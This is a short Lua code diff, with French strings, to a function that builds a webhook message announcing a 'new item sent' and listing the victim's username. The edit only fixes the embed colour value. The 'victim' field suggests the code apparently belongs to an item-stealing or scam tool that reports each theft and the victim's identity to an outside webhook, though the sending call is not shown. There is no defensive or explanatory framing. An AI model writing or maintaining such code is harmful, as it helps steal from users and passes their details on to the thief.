@@ -10,7 +10,7 @@ function SendMessage(url, username, itemID)
     local data = {
         ["embeds"] = {{
             ["title"] = "Nouvel objet envoyé",
-            ["color"] = 884DA7,
+            ["color"] = 10053324,
             ["fields"] = {
                 {
                     ["name"] = "Nom d'utilisateur de la victime :",
